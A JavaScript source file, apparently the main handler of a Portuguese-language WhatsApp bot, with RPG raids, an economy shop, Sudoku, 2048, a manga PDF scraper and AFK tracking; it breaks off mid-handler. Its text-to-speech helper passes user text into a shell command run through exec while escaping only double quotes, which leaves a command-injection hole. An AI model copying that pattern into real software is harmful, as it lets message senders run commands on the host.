// Bot desenvolvido por: KYARA
// Todos os direitos reservados © 2026
// Proibida a venda ou revenda desta base sem autorização.
//NAO TIRA OS CRÉDITOS LEIA O README PARA ENTENDER O PORQUE
// Bot oficial: Kyara & Kyara-AI
// Kyara
//TikTok: @kyara

// Site Oficial
// https://

// Comunidade oficial
// https://chat.whatsapp.com/ClSdOMal1Rc7EbOay45cew

//=============[ COMEÇO DE TUDO ]=============\\

const { menumemb, menubrink, menuRPG } = require("./dono/menus/menu");
const { promoverUser, rebaixarUser } = require('./gzee');
const axios = require('axios');
const baileys = require("@systemzero/baileys");
const { NumberDono, prefix, NickDono, NomeBot, SHIZUKU_KEY, SHIZUKU_SITE, sysite, syskey } = require("./dono/dono");
const ytSearch = require('yt-search');
const chalk = require('chalk');
const nexia = require('./nexia-sdk');
const API_KEY = 'API_KEY_NEXIA';
const crypto = require('crypto')
const { generateWAMessageFromContent, prepareWAMessageMedia, downloadMediaMessage } = require('@systemzero/baileys')
const { searchSite } = require('./database/searchSites');
const API_SPOTIFY = "https://api.vreden.my.id/api";
const yts = require("yt-search");
const { exec } = require('child_process');
const cheerio = require('cheerio');
const bancoPath = './database/banco.json';
const FormData = require("form-data")
const figurinhas = require('./database/figurinhas.json')
const MODEL = "qwen/qwen3-next-80b-a3b-instruct:free";
const OPENROUTER_KEY = 'API_KEY_ROUTER';
const fs = require("fs");

const selos = require('./database/selos');

const afkPath = './database/afk.json';

function carregarAfk() {
    if (!fs.existsSync(afkPath))
        fs.writeFileSync(afkPath, '{}');

    return JSON.parse(fs.readFileSync(afkPath));
}

function salvarAfk(db) {
    fs.writeFileSync(afkPath, JSON.stringify(db, null, 2));
}

const afk = carregarAfk();

function salvarBanco(){

try {

fs.writeFileSync(
bancoPath,
JSON.stringify(global.banco,null,2)
);

} catch(e){

console.log("Erro ao salvar banco:",e);

}

}

const {
    spotifySearch,
    spotifyDownload
} = require("./DATABASE2/SCRAPERS/scrapers");

const caminhoAluguel = "./database/aluguel.json";
const ALUGUEL_OBRIGATORIO = false;
const caminhoPedidosAluguel = "./database/pedidosAluguel.json";

const CHAVE_PIX = "9dd26dab-1058-4150-a1ed-426e299555f5";

// ===============================
// SISTEMA RAID RPG
// BASE DA RAID
// ===============================

const classesRPG = {

guerreiro: {
nome: "⚔️ Guerreiro",
emoji: "⚔️",
hp: 150,
atk: 25,
def: 15,
crit: 5,
descricao: "Especialista em combate corpo a corpo."
},

arqueiro: {
nome: "🏹 Arqueiro",
emoji: "🏹",
hp: 120,
atk: 22,
def: 10,
crit: 15,
descricao: "Grande precisão e crítico."
},

mago: {
nome: "🧙 Mago",
emoji: "🧙",
hp: 100,
atk: 35,
def: 8,
crit: 10,
descricao: "Muito dano mágico."
},

paladino: {
nome: "🛡️ Paladino",
emoji: "🛡️",
hp: 180,
atk: 18,
def: 25,
crit: 3,
descricao: "Excelente defesa."
},

assassino: {
nome: "🗡️ Assassino",
emoji: "🗡️",
hp: 110,
atk: 28,
def: 8,
crit: 25,
descricao: "Especialista em críticos."
}

};

function criarRPG(usuario){

if(!usuario.rpg){

usuario.rpg={

classe:null,

nivel:1,

xp:0,

hp:100,

hpMax:100,

atk:10,

def:5,

crit:5,

mana:50,

manaMax:50,

pontos:0,

vitorias:0,

derrotas:0,

equipamentos:{
arma:null,
armadura:null,
acessorio:null
},

skills:[],

titulo:"Aventureiro",

ultimaRaid:0

};

}

return usuario.rpg;

}

function salvarClasse(usuario,classe){

const c=classesRPG[classe];

usuario.rpg={

classe,

nivel:1,

xp:0,

hp:c.hp,

hpMax:c.hp,

atk:c.atk,

def:c.def,

crit:c.crit,

mana:50,

manaMax:50,

pontos:0,

vitorias:0,

derrotas:0,

equipamentos:{
arma:null,
armadura:null,
acessorio:null
},

skills:[],

titulo:"Novato",

ultimaRaid:0

};

}

function pegarLoot(){

const itens = [
{
nome:"💎 Cristal Mágico",
chance:40
},
{
nome:"⚔️ Espada Antiga",
chance:30
},
{
nome:"🛡️ Escudo Raro",
chance:20
},
{
nome:"👑 Item Lendário",
chance:10
}
];


let sorte = Math.random()*100;

let acumulado = 0;


for(let item of itens){

acumulado += item.chance;


if(sorte <= acumulado){

return item;

}

}


return itens[0];

}

async function finalizarRaid(from, conn){

const raid = global.raids[from];

if(!raid)
return;


raid.estado="finalizada";


let ranking = Object.entries(raid.jogadores)
.sort((a,b)=>b[1].dano-a[1].dano);



let mvp = ranking[0];


let texto = `
╔═══━━ ⚔️ RAID FINALIZADA ⚔️ ━━═══╗

🏆 BOSS DERROTADO!

👹 ${raid.boss.nome}

━━━━━━━━━━━━━━

🥇 MVP:
@${mvp[0]}

⚔️ Dano:
${mvp[1].dano}

━━━━━━━━━━━━━━

🎁 RECOMPENSAS
`;



let mentions=[];



for(const [id,player] of Object.entries(raid.jogadores)){


mentions.push(id+"@s.whatsapp.net");



if(!global.banco[id]){

global.banco[id]={

saldo:0,
xp:0,
nivel:1,
inventario:{}

};

}



let premio = raid.boss.premio;

let xp = raid.boss.xp;



// bônus do MVP

if(id === mvp[0]){

premio *= 2;

xp *= 2;

texto += `

👑 @${id}
💰 +${premio}
⭐ +${xp} XP
(MVP)
`;

}else{


texto += `

⚔️ @${id}
💰 +${premio}
⭐ +${xp} XP
`;

}



global.banco[id].saldo += premio;

global.banco[id].xp += xp;



// subir nível

let novoNivel = Math.floor(
    global.banco[id].xp / 1000
) + 1;


if(novoNivel > (global.banco[id].nivel || 1)){

    global.banco[id].nivel = novoNivel;

    texto += `
🎉 @${id} subiu para o nível ${novoNivel}!
`;

}



// vitória

global.banco[id].vitorias =
(global.banco[id].vitorias || 0) + 1;



// loot

let loot = pegarLoot();


if(!global.banco[id].inventario)
global.banco[id].inventario = {};



global.banco[id].inventario[loot.nome] =
(global.banco[id].inventario[loot.nome] || 0) + 1;



texto += `
🎁 Loot recebido:
${loot.emoji} ${loot.nome}
`;



// salva banco

salvarBanco();


}



texto += `
╚════════════════╝
`;



await conn.sendMessage(from,{
    text: texto,
    mentions
});



// remove raid

delete global.raids[from];


// cooldown 30 minutos

global.cooldownRaid[from] =
Date.now() + (30 * 60 * 1000);

delete global.raids[from];


}

if (!global.raids) global.raids = {};

const bossesRaid = [
{
nome: "🐉 Dragão Ancestral",
hp: 15000,
atk: 350,
premio: 5000,
xp: 800
},
{
nome: "👹 Demônio Infernal",
hp: 20000,
atk: 450,
premio: 8000,
xp: 1200
},
{
nome: "🧟 Rei Zumbi",
hp: 12000,
atk: 280,
premio: 4000,
xp: 700
},
{
nome: "🦇 Vampiro Sombrio",
hp: 14000,
atk: 320,
premio: 6000,
xp: 900
},
{
nome: "💀 Caveira Titã",
hp: 18000,
atk: 400,
premio: 7000,
xp: 1100
}
];

function barraHP(atual, total) {

let porcentagem = Math.floor((atual / total) * 10);

return "█".repeat(porcentagem) +
"░".repeat(10 - porcentagem);

}

// ===============================
// ATAQUE DO BOSS
// ===============================


async function ataqueBoss(from,conn){

const raid = global.raids[from];


if(!raid)
return;


let vivos = Object.entries(
raid.jogadores
)
.filter(([id,p])=>p.hp>0);



if(vivos.length === 0){

raid.estado="finalizada";


return conn.sendMessage(from,{
text:
`
☠️ *DERROTA*

O boss derrotou todos os guerreiros.
`
});

}



let alvo = vivos[
Math.floor(Math.random()*vivos.length)
];


let id = alvo[0];

let player = alvo[1];



let dano = Math.floor(
Math.random()*raid.boss.atk
)+100;



if(player.defendendo){

dano = Math.floor(dano/2);

player.defendendo=false;

}



dano -= player.def/2;


if(dano < 10)
dano = 10;



player.hp -= dano;


if(player.hp < 0)
player.hp=0;



await conn.sendMessage(from,{
text:
`
👹 *ATAQUE DO BOSS*

${raid.boss.nome}

🎯 Alvo:
@${id}

💥 Dano:
${dano}

❤️ Vida restante:

${player.hp}/${player.hpMax}
`,
mentions:[id+"@s.whatsapp.net"]
});

}

function sortearRaridade() {
    const chance = Math.random() * 100;

    if (chance < 68) return "comum";
    if (chance < 90) return "rara";
    if (chance < 98) return "epica";
    return "lendaria";
}

function figurinhaAleatoria() {
    const raridade = sortearRaridade();
    const lista = figurinhas.filter(f => f.raridade === raridade);

    return lista[Math.floor(Math.random() * lista.length)];
}

function jsonLoad(file) {
    if (!fs.existsSync(file)) {
        fs.writeFileSync(file, JSON.stringify({}, null, 2));
    }

    return JSON.parse(fs.readFileSync(file));
}

function jsonSave(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function carregarAluguel() {
    return jsonLoad(caminhoAluguel);
}

function salvarAluguel(db) {
    jsonSave(caminhoAluguel, db);
}

function carregarPedidosAluguel() {
    return jsonLoad(caminhoPedidosAluguel);
}

function salvarPedidosAluguel(db) {
    jsonSave(caminhoPedidosAluguel, db);
}

function aluguelAtivo(groupId) {
    const db = carregarAluguel();

    if (!db[groupId]) return false;

    if (Date.now() >= db[groupId].expira) {
        delete db[groupId];
        salvarAluguel(db);
        return false;
    }

    return db[groupId];
}

function gerarIdPedido() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

const pedidosPath = './database/pedidos.json';

function carregarPedidos() {
if (!fs.existsSync(pedidosPath)) {
fs.writeFileSync(pedidosPath, '{}');
}
return JSON.parse(fs.readFileSync(pedidosPath));
}

function salvarPedidos(db) {
fs.writeFileSync(pedidosPath, JSON.stringify(db, null, 2));
}

function carregarBanco() {
if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}
return JSON.parse(fs.readFileSync(bancoPath));
}

function salvarBanco(db) {
fs.writeFileSync(bancoPath, JSON.stringify(db, null, 2));
}

function getUserBancoId(info, sender, isGroup) {
return jidNormalizedUser(sender);
}

function verificarConta(db, user) {
if (!db[user]) {
db[user] = {
saldo: 0,
xp: 0,
inventario: {},
pets: {},
pescaPendente: null,
mineracaoPendente: null,
cacaPendente: null,
batalhaNaval: {
partidas: 0,
vitorias: 0,
derrotas: 0,
recompensaTotal: 0
}
};
}
}

const path = require('path');;
const { version } = require("./package");
const {
    sistemaVerificacao
} = require('./database/verificacao');
const { 
fetchJson, 
colors, 
hora, 
data, 
getBuffer,
SimilarComandos, 
ListaComandos, 
getGroupAdmins, 
getMembros, 
moment, 
msg,
kyun,
infoSystem,
os,
menu,
menus, 
FotoMenu,
Config,
Config2,
linkfy,
util,
jpzinhhomi,
Shizukuu,
sleep,
ShizukuStile,
Cmd,
BuscarNogpt,
BaixarNoYt,
ttkdl,
instadl,
play_video,
METADINHAS,
ANT_LTR_MD_EMJ,
dono1,
dono2,
dono3,
dono4,
dono5,
dono6,
sendImageAsSticker2,
 sendVideoAsSticker2,
 getFileBuffer,
 downloadContentFromMessage,
 jidNormalizedUser
} = require("./consts");

if (process.listenerCount("uncaughtException") === 0) {
  process.on("uncaughtException", (err) => {
    console.log("🔥 ERRO REAL:");
    console.log(err.stack);
  });
}

if (process.listenerCount("unhandledRejection") === 0) {
  process.on("unhandledRejection", (err) => {
    console.log("🔥 PROMISE ERRO REAL:");
    console.log(err.stack || err);
  });
}

const metadataCache = new Map();

async function getGroupMetadataCached(conn, jid) {
try {
if (!conn?.user) return null;
if (!jid || !jid.endsWith("@g.us")) return null;

const now = Date.now();
const cache = metadataCache.get(jid);

if (cache && now - cache.time < 60000) return cache.data;

const data = await conn.groupMetadata(jid).catch(() => null);
if (!data) return cache?.data || null;

metadataCache.set(jid, { data, time: now });
return data;
} catch {
return null;
}
}

async function enviarFotoPV(nomePasta, titulo) {
    const pasta = `./menu18/${nomePasta}`;

    if (!fs.existsSync(pasta))
        return reply('❌ Pasta não encontrada.');

    const arquivos = fs.readdirSync(pasta).filter(f =>
        /\.(jpg|jpeg|png|webp)$/i.test(f)
    );

    if (!arquivos.length)
        return reply('❌ Nenhuma foto encontrada.');

    const foto = arquivos[Math.floor(Math.random() * arquivos.length)];

    await conn.sendMessage(sender, {
        image: fs.readFileSync(path.join(pasta, foto)),
        caption: `🔥 ${titulo}`
    });

    reply(`✅ Foto enviada no seu privado.`);
}

const vozesTTS = {
  ana: "pt-BR-FranciscaNeural",
  antonio: "pt-BR-AntonioNeural",
  brenda: "pt-BR-BrendaNeural",
  donato: "pt-BR-DonatoNeural",
  elza: "pt-BR-ElzaNeural",
  fabio: "pt-BR-FabioNeural",
  giovanna: "pt-BR-GiovannaNeural",
  humberto: "pt-BR-HumbertoNeural",
  julio: "pt-BR-JulioNeural",
  leila: "pt-BR-LeilaNeural",
  leticia: "pt-BR-LeticiaNeural",
  manuela: "pt-BR-ManuelaNeural",
  nicolly: "pt-BR-NicollyNeural",
  ricardo: "pt-BR-RicardoNeural",
  thalita: "pt-BR-ThalitaNeural",
  valerio: "pt-BR-ValerioNeural",
  yara: "pt-BR-YaraNeural",
  aria: "en-US-AriaNeural",
  guy: "en-US-GuyNeural",
  elvira: "es-ES-ElviraNeural"
};

function gerarTTS(texto, voz, arquivo, volume = 100, velocidade = 0) {
  return new Promise((resolve, reject) => {
    const rate = `${velocidade >= 0 ? "+" : ""}${velocidade}%`;
    const vol = `${volume >= 100 ? "+" + (volume - 100) : "-" + (100 - volume)}%`;

    const textoSeguro = texto.replace(/"/g, "'");

    const cmd = `python -m edge_tts --text "${textoSeguro}" --voice "${voz}" --rate="${rate}" --volume="${vol}" --write-media "${arquivo}"`;

    exec(cmd, (err, stdout, stderr) => {
      if (err) return reject(stderr || err);
      resolve(true);
    });
  });
}

async function handleMangaButton(conn, message) {
try {
const PDFDocument = require("pdfkit");

global.mangaCache = global.mangaCache || new Map();

const interactive = message.message?.interactiveResponseMessage;
if (!interactive) return false;

const native = interactive.nativeFlowResponseMessage;
if (!native) return false;

const params = JSON.parse(native.paramsJson || "{}");
const selectedId = params.selectedId || params.id;

if (!selectedId || !global.mangaCache.has(selectedId)) return false;

const dados = global.mangaCache.get(selectedId);
global.mangaCache.delete(selectedId);

await conn.sendMessage(message.key.remoteJid, {
react: { text: "⏳", key: message.key }
});

async function pegarPaginas(urlCap) {
const { data } = await axios.get(urlCap, {
headers: {
"User-Agent": "Mozilla/5.0",
"Referer": "https://mangalivre.blog/"
},
timeout: 20000
});

const $ = cheerio.load(data);
let paginas = [];

$(".chapter-content img, .reading-content img, .page-break img, img").each((_, el) => {
const src = $(el).attr("src") || $(el).attr("data-src") || $(el).attr("data-lazy-src");

if (
src &&
/\.(jpg|jpeg|png|webp)$/i.test(src) &&
!src.includes("logo") &&
!src.includes("avatar") &&
!src.includes("banner")
) {
paginas.push(src);
}
});

return [...new Set(paginas)];
}

async function criarPDF(capitulos) {
return new Promise(async (resolve, reject) => {
try {
const doc = new PDFDocument({ autoFirstPage: false });
const buffers = [];

doc.on("data", b => buffers.push(b));
doc.on("end", () => resolve(Buffer.concat(buffers)));
doc.on("error", reject);

for (const cap of capitulos) {
for (const imgUrl of cap.paginas) {
try {
const res = await axios.get(imgUrl, {
responseType: "arraybuffer",
timeout: 30000,
headers: {
"User-Agent": "Mozilla/5.0",
"Referer": "https://mangalivre.blog/"
}
});

const img = Buffer.from(res.data);

doc.addPage();
doc.image(img, 0, 0, {
fit: [doc.page.width, doc.page.height],
align: "center",
valign: "center"
});

} catch {}
}
}

doc.end();
} catch (e) {
reject(e);
}
});
}

let capitulosProntos = [];
let totalPaginas = 0;

for (const cap of dados.capitulos) {
const paginas = await pegarPaginas(cap.url);

if (paginas.length) {
capitulosProntos.push({
numero: cap.numero,
paginas
});

totalPaginas += paginas.length;
}
}

if (!capitulosProntos.length) {
await conn.sendMessage(message.key.remoteJid, {
react: { text: "❌", key: message.key }
});
return true;
}

const pdfBuffer = await criarPDF(capitulosProntos);

const tempDir = path.join(__dirname, "temp");
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

const nome = `${dados.manga}_Capitulos.pdf`.replace(/[^a-zA-Z0-9_.-]/g, "_");
const pdfPath = path.join(tempDir, `${Date.now()}_${nome}`);

fs.writeFileSync(pdfPath, pdfBuffer);

await conn.sendMessage(message.key.remoteJid, {
document: { url: pdfPath },
mimetype: "application/pdf",
fileName: nome,
caption:
`📚 *${dados.manga}*

📖 Capítulos: ${capitulosProntos.length}
📄 Páginas: ${totalPaginas}

✅ PDF gerado com sucesso!`
});

try { fs.unlinkSync(pdfPath); } catch {}

await conn.sendMessage(message.key.remoteJid, {
react: { text: "✅", key: message.key }
});

return true;

} catch (e) {
console.log("[MANGA BUTTON ERRO]", e);
try {
await conn.sendMessage(message.key.remoteJid, {
react: { text: "❌", key: message.key }
});
} catch {}
return false;
}
}

const lojaItems = [
{ id: 1, nome: "🛡️ Escudo Anti-Assalto", preco: 5000, item: "escudo" },
{ id: 2, nome: "🍀 Amuleto da Sorte", preco: 3500, item: "amuleto" },
{ id: 3, nome: "💼 Maleta Premium", preco: 8000, item: "maleta" },
{ id: 4, nome: "👑 VIP Econômico", preco: 15000, item: "vipEco" },
{ id: 5, nome: "📱 Motorola K10", preco: 2000, item: "k10" },
{ id: 6, nome: "📱 Samsung a15", preco: 7500, item: "a15" },
{ id: 7, nome: "📱 Samsung S26", preco: 25000, item: "samsung" },
{ id: 8, nome: "💻 Notebook", preco: 18000, item: "notebook" },
{ id: 9, nome: "🖥️ PC Gamer", preco: 50000, item: "pcgamer" },
{ id: 10, nome: "⌚ Smartwatch", preco: 6500, item: "smartwatch" },
{ id: 11, nome: "🎧 Headset Gamer", preco: 4500, item: "headset" },
{ id: 12, nome: "🚲 Bicicleta", preco: 12000, item: "bike" },
{ id: 13, nome: "🏍️ Moto 160", preco: 70000, item: "160" },
{ id: 14, nome: "🏍️ Moto Ninja 400", preco: 150000, item: "ninja" },
{ id: 15, nome: "🚗 Carro Peugeot", preco: 250000, item: "peugeot" },
{ id: 16, nome: "🚗 Carro BMW M5", preco: 800000, item: "bmwm5" },
{ id: 17, nome: "🏠 Casa Simples", preco: 500000, item: "casa1" },
{ id: 18, nome: "🏡 Casa de Luxo", preco: 2500000, item: "casa2" },
{ id: 19, nome: "🏰 Mansão", preco: 10000000, item: "mansao" },
{ id: 20, nome: "💎 Diamante Raro", preco: 50000, item: "diamante" },
{ id: 21, nome: "🥇 Barra de Ouro", preco: 30000, item: "ouro" },
{ id: 22, nome: "💰 Cofre Bancário", preco: 90000, item: "cofre" },
{ id: 23, nome: "🛫 Jato Particular", preco: 50000000, item: "jato" },
{ id: 24, nome: "🚁 Helicóptero", preco: 20000000, item: "helicoptero" }
];

const empregos = [
{ id: 1, nome: "🧹 Faxineiro", xp: 0, min: 100, max: 200 },
{ id: 2, nome: "🚴 Entregador", xp: 0, min: 200, max: 350 },
{ id: 3, nome: "🛒 Atendente", xp: 0, min: 300, max: 500 },
{ id: 4, nome: "🔧 Mecânico", xp: 3500, min: 3600, max: 5300 },
{ id: 5, nome: "💻 Programador", xp: 7000, min: 6000, max: 10000 },
{ id: 6, nome: "👨‍⚕️ Médico", xp: 9000, min: 10000, max: 15000 },
{ id: 7, nome: "👨‍💼 Empresário", xp: 12000, min: 15000, max: 22000 },
{ id: 8, nome: "🏦 Banqueiro", xp: 18000, min: 25000, max: 35000 },
{ id: 9, nome: "🏢 Diretor de Empresa", xp: 25000, min: 40000, max: 60000 },
{ id: 10, nome: "🚀 Dono de Startup", xp: 35000, min: 70000, max: 90000 },
{ id: 11, nome: "🧠 Cientista", xp: 45000, min: 100000, max: 150000 },
{ id: 12, nome: "⚖️ Advogado Famoso", xp: 60000, min: 160000, max: 220000 },
{ id: 13, nome: "🏛️ Governador", xp: 80000, min: 250000, max: 350000 },
{ id: 14, nome: "💎 Magnata", xp: 100000, min: 400000, max: 600000 },
{ id: 15, nome: "🌎 Bilionário", xp: 150000, min: 700000, max: 900000 },
{ id: 16, nome: "👑 Rei dos Negócios", xp: 200000, min: 1000000, max: 1500000 },
{ id: 17, nome: "🔥 Lenda Empresarial", xp: 300000, min: 2000000, max: 3000000 },
{ id: 18, nome: "⚡ Fundador da Kyara", xp: 500000, min: 5000000, max: 8000000 },
{ id: 19, nome: "🌌 Criador Supremo", xp: 999999, min: 10000000, max: 20000000 },
{ id: 20, nome: "👑 ADM da Kyara", xp: 99999999999, min: 99999999, max: 99999999 },
{ id: 21, nome: "🛡️ Segurança Particular", xp: 250000, min: 3000000, max: 5000000 },
{ id: 22, nome: "✈️ Piloto de Avião", xp: 300000, min: 6000000, max: 9000000 },
{ id: 23, nome: "🏰 Dono de Mansões", xp: 400000, min: 10000000, max: 15000000 },
{ id: 24, nome: "📈 Investidor Global", xp: 500000, min: 20000000, max: 30000000 },
{ id: 25, nome: "💰 Presidente de Multinacional", xp: 650000, min: 40000000, max: 60000000 },
{ id: 26, nome: "🌐 Controlador do Mercado", xp: 800000, min: 70000000, max: 100000000 },
{ id: 27, nome: "🏆 Ícone Mundial", xp: 1000000, min: 150000000, max: 250000000 },
{ id: 28, nome: "🪐 Imperador dos Negócios", xp: 1500000, min: 300000000, max: 500000000 },
{ id: 29, nome: "⚜️ Lenda da Kyara", xp: 2000000, min: 700000000, max: 1000000000 },
{ id: 30, nome: "👑 Dono Absoluto da Kyara", xp: 99999999999, min: 9999999999, max: 9999999999 }
];
function tempo(ms) {
let h = Math.floor(ms / 3600000);
let m = Math.floor((ms % 3600000) / 60000);
let s = Math.floor((ms % 60000) / 1000);
return `${h}h ${m}m ${s}s`;
}

const jogosSudoku = {}

function gerarSudoku() {
  const sudokus = [
    {
      puzzle: [
        [5,3,0,0,7,0,0,0,0],
        [6,0,0,1,9,5,0,0,0],
        [0,9,8,0,0,0,0,6,0],
        [8,0,0,0,6,0,0,0,3],
        [4,0,0,8,0,3,0,0,1],
        [7,0,0,0,2,0,0,0,6],
        [0,6,0,0,0,0,2,8,0],
        [0,0,0,4,1,9,0,0,5],
        [0,0,0,0,8,0,0,7,9]
      ],
      solution: [
        [5,3,4,6,7,8,9,1,2],
        [6,7,2,1,9,5,3,4,8],
        [1,9,8,3,4,2,5,6,7],
        [8,5,9,7,6,1,4,2,3],
        [4,2,6,8,5,3,7,9,1],
        [7,1,3,9,2,4,8,5,6],
        [9,6,1,5,3,7,2,8,4],
        [2,8,7,4,1,9,6,3,5],
        [3,4,5,2,8,6,1,7,9]
      ]
    },
    {
      puzzle: [
        [0,0,0,2,6,0,7,0,1],
        [6,8,0,0,7,0,0,9,0],
        [1,9,0,0,0,4,5,0,0],
        [8,2,0,1,0,0,0,4,0],
        [0,0,4,6,0,2,9,0,0],
        [0,5,0,0,0,3,0,2,8],
        [0,0,9,3,0,0,0,7,4],
        [0,4,0,0,5,0,0,3,6],
        [7,0,3,0,1,8,0,0,0]
      ],
      solution: [
        [4,3,5,2,6,9,7,8,1],
        [6,8,2,5,7,1,4,9,3],
        [1,9,7,8,3,4,5,6,2],
        [8,2,6,1,9,5,3,4,7],
        [3,7,4,6,8,2,9,1,5],
        [9,5,1,7,4,3,6,2,8],
        [5,1,9,3,2,6,8,7,4],
        [2,4,8,9,5,7,1,3,6],
        [7,6,3,4,1,8,2,5,9]
      ]
    },
    {
      puzzle: [
        [0,2,0,6,0,8,0,0,0],
        [5,8,0,0,0,9,7,0,0],
        [0,0,0,0,4,0,0,0,0],
        [3,7,0,0,0,0,5,0,0],
        [6,0,0,0,0,0,0,0,4],
        [0,0,8,0,0,0,0,1,3],
        [0,0,0,0,2,0,0,0,0],
        [0,0,9,8,0,0,0,3,6],
        [0,0,0,3,0,6,0,9,0]
      ],
      solution: [
        [1,2,3,6,7,8,9,4,5],
        [5,8,4,2,3,9,7,6,1],
        [9,6,7,1,4,5,3,2,8],
        [3,7,2,4,6,1,5,8,9],
        [6,9,1,5,8,3,2,7,4],
        [4,5,8,7,9,2,6,1,3],
        [8,3,6,9,2,4,1,5,7],
        [2,1,9,8,5,7,4,3,6],
        [7,4,5,3,1,6,8,9,2]
      ]
    }
  ]

  return sudokus[Math.floor(Math.random() * sudokus.length)]
}

function mostrarSudoku(tabuleiro) {
  let txt = '╭━━━「 🧩 SUDOKU 」━━━╮\n'
  for (let i = 0; i < 9; i++) {
    if (i % 3 === 0 && i !== 0) txt += '┣━━━━━━━━━━━━━━━┫\n'
    txt += '┃ '
    for (let j = 0; j < 9; j++) {
      if (j % 3 === 0 && j !== 0) txt += '│ '
      txt += tabuleiro[i][j] === 0 ? '⬜ ' : `${tabuleiro[i][j]} `
    }
    txt += '┃\n'
  }
  txt += '╰━━━━━━━━━━━━━━━╯\n\n'
  txt += 'Use: $sudoku linha coluna número\n'
  txt += 'Ex: $sudoku 1 3 4'
  return txt
}

function sudokuCompleto(tabuleiro) {
  return tabuleiro.every(linha => linha.every(num => num !== 0))
}

const jogos2048 = {}

function novo2048() {
  const board = Array.from({ length: 4 }, () => Array(4).fill(0))
  add2048(board)
  add2048(board)
  return board
}

function add2048(board) {
  const vazios = []
  for (let i = 0; i < 4; i++) {
    for (let j = 0; j < 4; j++) {
      if (board[i][j] === 0) vazios.push([i, j])
    }
  }
  if (!vazios.length) return
  const [i, j] = vazios[Math.floor(Math.random() * vazios.length)]
  board[i][j] = Math.random() < 0.9 ? 2 : 4
}

function mostrar2048(board, score = 0) {
  let txt = `╭━━━「 🎮 2048 」━━━╮\n`
  txt += `┃ Pontos: ${score}\n`
  txt += `┣━━━━━━━━━━━━━━━┫\n`

  for (const linha of board) {
    txt += '┃ '
    txt += linha.map(n => n === 0 ? '⬜' : String(n).padStart(4, ' ')).join(' ')
    txt += ' ┃\n'
  }

  txt += `╰━━━━━━━━━━━━━━━╯\n\n`
  txt += `Use:\n`
  txt += `$2048 cima\n`
  txt += `$2048 baixo\n`
  txt += `$2048 esquerda\n`
  txt += `$2048 direita\n`
  txt += `$2048 sair`
  return txt
}

function moverLinha2048(linha) {
  let nums = linha.filter(n => n !== 0)
  let pontos = 0

  for (let i = 0; i < nums.length - 1; i++) {
    if (nums[i] === nums[i + 1]) {
      nums[i] *= 2
      pontos += nums[i]
      nums.splice(i + 1, 1)
    }
  }

  while (nums.length < 4) nums.push(0)
  return { linha: nums, pontos }
}

function clonar2048(board) {
  return board.map(l => [...l])
}

function igual2048(a, b) {
  return JSON.stringify(a) === JSON.stringify(b)
}

function mover2048(board, dir) {
  let pontos = 0
  let novo = clonar2048(board)

  if (dir === 'esquerda') {
    for (let i = 0; i < 4; i++) {
      const r = moverLinha2048(novo[i])
      novo[i] = r.linha
      pontos += r.pontos
    }
  }

  if (dir === 'direita') {
    for (let i = 0; i < 4; i++) {
      const r = moverLinha2048(novo[i].reverse())
      novo[i] = r.linha.reverse()
      pontos += r.pontos
    }
  }

  if (dir === 'cima') {
    for (let j = 0; j < 4; j++) {
      const coluna = [novo[0][j], novo[1][j], novo[2][j], novo[3][j]]
      const r = moverLinha2048(coluna)
      for (let i = 0; i < 4; i++) novo[i][j] = r.linha[i]
      pontos += r.pontos
    }
  }

  if (dir === 'baixo') {
    for (let j = 0; j < 4; j++) {
      const coluna = [novo[0][j], novo[1][j], novo[2][j], novo[3][j]].reverse()
      const r = moverLinha2048(coluna)
      const voltada = r.linha.reverse()
      for (let i = 0; i < 4; i++) novo[i][j] = voltada[i]
      pontos += r.pontos
    }
  }

  return { board: novo, pontos }
}

function perdeu2048(board) {
  for (let i = 0; i < 4; i++) {
    for (let j = 0; j < 4; j++) {
      if (board[i][j] === 0) return false
      if (j < 3 && board[i][j] === board[i][j + 1]) return false
      if (i < 3 && board[i][j] === board[i + 1][j]) return false
    }
  }
  return true
}

async function uploadTmpFiles(buffer, filename, mimetype) {
const form = new FormData();

form.append('file', buffer, {
filename,
contentType: mimetype
});

const { data } = await axios.post(
'https://tmpfiles.org/api/v1/upload',
form,
{
headers: form.getHeaders()
}
);

return data.data.url.replace(
'tmpfiles.org/',
'tmpfiles.org/dl/'
);
}

async function uploadTelegraph(buffer, filename, mimetype) {
const form = new FormData();

form.append('file', buffer, {
filename,
contentType: mimetype
});

try {
const { data } = await axios.post(
'https://telegra.ph/upload',
form,
{
headers: form.getHeaders()
}
);

if (!data?.[0]?.src) throw new Error();

return `https://telegra.ph${data[0].src}`;

} catch {
return await uploadTmpFiles(
buffer,
filename,
mimetype
);
}
}

//início do module
module.exports = async (conn, m, chatUpdate) => {
console.log("✅ INDEX ABRIU");

const upsert = chatUpdate; // se quiser manter nome antigo

try {
const info = upsert?.messages && upsert?.messages[0];
if (!info) return;
if (!conn?.user) return;

const mangaBtn = await handleMangaButton(conn, info);
if (mangaBtn) return;

const from = info?.key?.remoteJid;
const isGroup = from.endsWith('@g.us');
const isCanal = from.endsWith('@newsletter');
const pushname = info?.pushName || await conn?.user?.name || "Usuário";
const content = JSON.stringify(info.message);
const quoted = info.quoted ? info.quoted : info
const sender = jidNormalizedUser(
  isGroup
    ? (
        info?.key?.participantAlt ||
        info?.key?.participant ||
        info?.key?.participantPn ||
        info?.key?.senderPn ||
        info?.participant
      )
    : (
        info?.key?.remoteJid ||
        info?.key?.participant ||
        info?.key?.senderPn
      )
);

const banco = carregarBanco();

verificarConta(banco, sender);

const isVip = banco[sender]?.vip === true;

if (afk[sender]) {
const tempo = Date.now() - afk[sender].desde;

reply(`✅ Bem-vindo de volta!\nVocê ficou AFK por ${ms(tempo)}.`);

delete afk[sender];
}

const mencionados = [
...(info.message?.extendedTextMessage?.contextInfo?.mentionedJid || [])
];

for (const jid of mencionados) {
if (afk[jid]) {
const tempo = Date.now() - afk[jid].desde;

reply(
`💤 Essa pessoa está AFK.\n\n📌 Motivo: ${afk[jid].motivo}\n⏰ Há: ${ms(tempo)}`
);
}
}

function ms(ms) {
let s = Math.floor(ms / 1000);
let m = Math.floor(s / 60);
let h = Math.floor(m / 60);
let d = Math.floor(h / 24);

s %= 60;
m %= 60;
h %= 24;

let txt = [];
if (d) txt.push(`${d}d`);
if (h) txt.push(`${h}h`);
if (m) txt.push(`${m}min`);
if (s) txt.push(`${s}s`);

return txt.join(' ');
}

console.log("SENDER:", sender);
